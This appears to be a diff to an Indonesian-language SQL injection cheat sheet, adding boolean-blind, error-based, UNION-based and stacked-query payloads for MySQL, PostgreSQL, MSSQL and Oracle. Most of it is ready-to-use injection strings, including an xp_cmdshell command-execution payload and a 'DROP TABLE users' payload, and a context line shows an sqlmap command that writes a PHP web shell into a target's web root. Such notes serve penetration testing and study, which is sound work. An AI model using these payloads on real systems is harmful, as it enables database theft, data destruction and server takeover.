@@ -37,6 +37,40 @@ SELECT * FROM users WHERE name = '' OR '1'='1' --'
 Tanda kutip pada input menutup string lebih awal, lalu -- mengomentari sisa query asli.
 Kondisi selalu benar → seluruh baris dikembalikan.
 
+* Boolean-based Blind
+# Konteks string — tutup kutip lalu komentari
+?id=1' AND 1=1-- - → benar
+?id=1' AND 1=2-- - → salah
+
+# Ekstraksi 1 karakter — varian DBMS
+MySQL ' AND SUBSTRING(database(),1,1)='a'-- -
+PgSQL ' AND SUBSTR(current_database(),1,1)='a'-- -
+MSSQL ' AND SUBSTRING(DB_NAME(),1,1)='a'-- -
+Oracle ' AND SUBSTR(user,1,1)='a'--
+
+* Error-based
+# Bocorkan data lewat pesan error
+MySQL ' AND extractvalue(1,concat(0x7e,database()))-- -
+PgSQL ' AND 1=cast((SELECT version()) AS int)-- -
+MSSQL ' AND 1=convert(int,(SELECT db_name()))-- -
+Oracle ' AND 1=utl_inaddr.get_host_name(user)-- -
+
+* UNION-based
+# 1. Cari jumlah kolom (semua DBMS)
+?id=1' ORDER BY 3-- -
+# 2. Ambil versi DBMS via UNION
+MySQL ' UNION SELECT 1,@@version,3-- -
+PgSQL ' UNION SELECT 1,version(),3-- -
+MSSQL ' UNION SELECT 1,@@version,3-- -
+Oracle ' UNION SELECT 1,banner,3 FROM v$version-- -
+
+* Stacked Queries
+# Dukungan & contoh per DBMS
+MSSQL ✓ '; EXEC xp_cmdshell('whoami')-- -
+PgSQL ✓ '; DROP TABLE users-- -
+Oracle ~ terbatas — blok PL/SQL anonim
+MySQL ✗ driver PHP (mysqli/PDO) menolak
+
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
 
 
